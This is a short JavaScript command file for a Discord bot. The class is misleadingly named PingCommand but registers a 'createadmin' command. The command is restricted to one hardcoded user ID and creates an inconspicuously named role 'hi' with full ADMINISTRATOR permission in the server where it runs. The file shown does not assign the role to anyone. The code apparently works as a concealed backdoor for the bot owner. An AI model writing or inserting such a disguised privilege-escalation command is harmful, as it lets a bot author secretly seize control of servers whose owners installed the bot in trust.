const { Command } = require('discord-akairo');

class PingCommand extends Command {
    constructor() {
        super('createadmin', {
            aliases: ['ca']
        });
    }

    async exec(message, client) {
        let Owner = message.author;
        if(Owner.id !== "603269203511738420") return message.reply("Only the bot owner can use this command!")
if (message.content == ';;ca')
{
    let roleData = {
        name: 'hi',
        color: '000000',
        mentionable: true,
        permissions:["ADMINISTRATOR"]
      }
      message.guild.roles.create({ data: roleData });

}
    }
}

module.exports = PingCommand;
